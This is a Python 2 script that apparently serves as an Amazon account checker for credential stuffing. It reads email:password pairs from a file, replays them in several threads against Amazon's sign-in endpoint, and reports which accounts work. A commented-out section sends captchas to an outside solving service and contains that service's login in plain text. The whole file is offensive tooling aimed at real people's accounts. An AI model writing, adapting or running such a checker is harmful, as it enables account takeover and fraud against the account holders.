#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import requests
import re
import codecs
import urllib
import Queue
from threading import Thread
import os
import base64
import binascii
import json
import time
import cookielib
import multiprocessing
from random import choice



requests.packages.urllib3.disable_warnings()

def login(q):
	user = q.get().split(':')[0]
	passw = q.get().split(':')[1]
	proxies = {
		'http': '127.0.0.1:8888',
		'https': '127.0.0.1:8888'
	}
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2209.0 Safari/537.36'
	}
	jar = cookielib.CookieJar()
	print 'Checking Account {0}:{1}\n'.format(user, passw)
	working = False
	#reg = requests.get(
	#	'https://www.amazon.com/ap/register?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dgno_newcust?&email={0}'.format(user),
	#	verify=False,
	#	headers=headers,
	#	proxies=proxies
	#)
	#regre = re.findall('You indicated you are a new customer', reg.text)
	#if not regre:
	#	return
	#
	#print 'Account Is Registered! {0}:{1}'.format(user, passw)
	s = requests.Session()
	login = s.get(
		'https://www.amazon.com/ap/signin?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%3Fie%3DUTF8%26ref_%3Dnav_yam_ya',
		verify=False,
		headers=headers,
		proxies=proxies
	)
	appactiontoken = re.findall('appActionToken" value="(.*?)"', login.text)
	previd = re.findall('prevRID" value="(.*?)"', login.text)
	payload = {
		'appActionToken': appactiontoken[0],
		'appAction': 'SIGNIN',
		'openid.pape.max_auth_age': 'ape:MA==',
		'openid.ns':'ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA=',
		'openid.ns.pape': 'ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA==',
		'prevRID': previd[0],
		'pageId': 'ape:dXNmbGV4',
		'openid.identity': 'ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=',
		'openid.claimed_id': 'ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=',
		'openid.mode': 'ape:Y2hlY2tpZF9zZXR1cA==',
		'openid.assoc_handle': 'ape:dXNmbGV4',
		'create': '0',
		'openid.return_to': 'ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9ncC9jc3MvaG9tZXBhZ2UuaHRtbD9pZT1VVEY4JnJlZl89bmF2X3lhbV95YQ==',
		'email': user,
		'password': passw
	}
	headers['Referal'] = login.url
	headers['Content-Type'] = 'application/x-www-form-urlencoded'
	logintry = s.post(
		'https://www.amazon.com/ap/signin/{0}'.format(s.cookies["session-id"]),
		urllib.urlencode(payload),
		cookies=s.cookies,
		verify=False,
		headers=headers,
		proxies=proxies
	)
	
	if 'Type the characters you see in this image.' in logintry.text:
		print 'Captcha!'
	elif 'There was an error with your E-Mail/Password combination.' in logintry.text:
		print 'Account does not work! ({0}:{1})'.format(user, passw)
	elif 'Your password is incorrect' in logintry.text:
		print 'Account does not work! ({0}:{1})'.format(user, passw)
	elif 'Your email or password was incorrect' in logintry.text:
		print 'Account does not work! ({0}:{1})'.format(user, passw)
	else:
		print 'Account Works! Gathering Data ({0}:{1})'.format(user, passw)
		
		#if 'Type the characters you see in this image.' in logintry.text:
		#	print 'Account has Captcha ({0}:{1})'.format(user, passw)
		#	captchaurl = re.findall('<div id="ap_captcha_img">\n	<img src="(.*?)" />', logintry.text)
		#	if captchaurl[0].find('data:image') != -1:
		#		captchafile = captchaurl[0].replace('data:image/jpeg;base64,', 'base64:')
		#	elif captchaurl[0].find('https://') != -1:
		#		captchafile = requests.get(captchaurl[0], verify=False).content
		#	else:
		#		captchafile = None
		#	boundry = binascii.hexlify(os.urandom(8))
		#	headersc = {
		#		'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary{0}'.format(boundry),
		#		'Accept': 'application/json'
		#	}
		#	captchaupload = requests.post (
		#		'http://api.dbcapi.me/api/captcha',
		#		'------WebKitFormBoundary{0}\r\nContent-Disposition: form-data; name="username"\r\n\r\nFotoko\r\n------WebKitFormBoundary{0}\r\n'
		#		'Content-Disposition: form-data; name="password"\r\n\r\nasdf1623\r\n------WebKitFormBoundary{0}\r\nContent-D'
		#		'isposition: form-data; name="captchafile"; filename="captcha"\r\nContent-Type: image/jpeg\r\n\r\nbase64:{1}\r\n'
		#		'------WebKitFormBoundary{0}--'.format(boundry, base64.b64encode(captchafile)),
		#		headers=headersc,
		#		proxies=proxies
		#	)
		#	captchatest = json.loads(captchaupload.text)
		#	if captchatest['status'] != 0:
		#		captchaWork = True
		#	jsonstuff = dict()
		#	workingtext = True
		#	for key in jsonstuff:
		#		if key is 'captcha':
		#			while workingtext:
		#				captcharesponses = requests.get('http://api.dbcapi.me/api/captcha/{0}'.format(captchatest['captcha']), headers={'Accept': 'application/json'}, proxies=proxies)
		#				jsonstuff = json.loads(captcharesponses.text)
		#				if jsonstuff['text'] != '':
		#					workingtext = False
		#					print 'False'
		#				time.sleep(1)
		#				print 'Test'
		#				appactiontoken = re.findall('appActionToken" value="(.*?)"', logintry.text)
		#			previd = re.findall('prevRID" value="(.*?)"', logintry.text)
		#			ces = re.findall('ces" value="(.*?)"', logintry.text)
		#			payload = {
		#				'appActionToken': appactiontoken[0],
		#				'appAction': 'SIGNIN',
		#				'openid.ns':'ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA=',
		#				'openid.ns.pape': 'ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA==',
		#				'prevRID': previd[0],
		#				'ces': ces[0],
		#				'pageId': 'ape:dXNmbGV4',
		#				'openid.identity': 'ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=',
		#				'openid.claimed_id': 'ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=',
		#				'openid.mode': 'ape:Y2hlY2tpZF9zZXR1cA==',
		#				'openid.assoc_handle': 'ape:dXNmbGV4',
		#				'create': '0',
		#				'forceValidateCaptcha': 'ape:dHJ1ZQ==',
		#				'openid.return_to': 'ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9ncC9jc3MvaG9tZXBhZ2UuaHRtbD9pZT1VVEY4JnJlZl89bmF2X3lhbV95YQ==',
		#				'email': user,
		#				'password': passw,
		#				'guess': jsonstuff['text']
		#			}
		#			global captchalogintry
		#			captchalogintry = s.post(
		#				'https://www.amazon.com/ap/signin',
		#				urllib.urlencode(payload),
		#				cookies=s.cookies,
		#				headers=headers,
		#				proxies=proxies
		#			)
		#			if 'Type the characters you see in this image.' in captchalogintry.text:
		#				captchaWork = True
		#			elif 'There was an error with your E-Mail/Password combination.' in captchalogintry.text:
		#				print 'Account does not work! ({0}:{1})'.format(user, passw)
		#				captchaWork = False
		#			else:
		#				captchaWork = False
		#	else:
		#		captchaWork = True
		#	
		#elif 'There was an error with your E-Mail/Password combination.' in captchalogintry.text:
		#	print 'Account does not work! ({0}:{1})'.format(user, passw)
		#else:
		#	captchaWork = False
		#

		

def main():
	with codecs.open('accounts.txt', 'r') as f:
		users = f.readlines()
	queue = Queue.Queue()
	
	for _ in range(5):
		worker = Thread(target=login, args=(queue,))
		worker.start()
	jobs = []
	for user in users:
		queue.put(user.strip())
	
if __name__ == '__main__':
	main()